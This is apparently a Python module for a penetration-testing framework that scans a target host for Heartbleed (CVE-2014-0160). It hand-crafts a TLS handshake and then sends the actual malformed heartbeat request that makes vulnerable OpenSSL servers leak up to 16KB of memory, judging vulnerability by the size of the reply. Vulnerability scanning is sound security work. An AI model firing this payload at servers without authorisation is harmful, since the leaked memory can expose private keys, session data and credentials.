import socket
import ssl
import struct
import time
from core.base_module import BaseModule
from rich.console import Console

# Helper function to receive TLS records
def recv_tls_record(s):
    header = s.recv(5)
    if not header or len(header) < 5:
        return None, None, None
    content_type, version, length = struct.unpack('>BHH', header)
    payload = b''
    while len(payload) < length:
        chunk = s.recv(length - len(payload))
        if not chunk:
            return None, None, None # Connection closed prematurely
        payload += chunk
    return content_type, version, payload

class HeartbleedScanner(BaseModule):
    """Scans for the Heartbleed vulnerability (CVE-2014-0160)."""

    def get_options(self):
        """Returns the options for this module."""
        return {
            'RHOST': ['', 'The target host IP address or domain.'],
            'RPORT': [443, 'The target SSL/TLS port.']
        }

    def run(self, options):
        """Executes the Heartbleed scan."""
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        console = Console()

        if not rhost:
            console.print("[!] RHOST must be set.", style="bold red")
            return

        console.print(f"[*] Scanning {rhost}:{rport} for Heartbleed (CVE-2014-0160)...")

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((rhost, rport))
            
            # Manually construct and send Client Hello (TLS 1.2)
            client_hello = bytes.fromhex(
                '16030100dc010000d80303'  # Record Layer, Handshake, TLS 1.2
                '53435b909d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d9d'  # Random
                '00'  # Session ID Length
                '001e'  # Cipher Suites Length
                'c02bc02fc023c027c00ac009c013c014009c009d002f0035000a'  # Cipher Suites
                '0100'  # Compression Methods Length
                '00'  # Compression Method: null
                '0049'  # Extensions Length
                '000b000403000102'  # EC Point Formats
                '000a00080006001d00170018'  # Elliptic Curves
                '00230000'  # SessionTicket TLS
                '000d0020001e060106020603050105020503040104020403030103020303020102020203'  # Signature Algorithms
                'ff01000100'  # Renegotiation Info
            )
            s.send(client_hello)

            # Wait for ServerHelloDone
            while True:
                content_type, _, payload = recv_tls_record(s)
                if content_type is None:
                    console.print("[!] Server closed connection unexpectedly during handshake.", style="bold red")
                    return
                if content_type == 22 and payload and payload[0] == 0x0e:
                    break

            console.print("[*] Handshake complete. Sending malicious heartbeat request...")
            
            # Construct Heartbleed payload (requesting 16KB with a 1-byte payload)
            heartbeat_payload = b'\x18\x03\x03\x00\x03\x01\x40\x00'
            s.send(heartbeat_payload)

            # Check for response
            content_type, _, payload = recv_tls_record(s)
            if content_type is None:
                console.print("[*] No response to heartbeat. Server is likely not vulnerable or connection dropped.", style="yellow")
                return
            
            if content_type == 24: # Heartbeat
                console.print("[bold green][+] Received heartbeat response![/bold green]")
                if len(payload) > 3:
                    console.print(f"[bold red][+] VULNERABLE! Server returned {len(payload)} bytes of memory.[/bold red]")
                else:
                    console.print("[*] Server returned a valid (short) heartbeat response. Not vulnerable.")
            elif content_type == 21: # Alert
                 console.print("[*] Server returned a TLS Alert. Not vulnerable.")
            else:
                console.print(f"[*] Received unexpected message type {content_type}. Not vulnerable.")

        except socket.timeout:
            console.print(f"[!] Connection to {rhost}:{rport} timed out.", style="bold red")
        except socket.error as e:
            console.print(f"[!] Connection to {rhost}:{rport} failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
        finally:
            s.close()
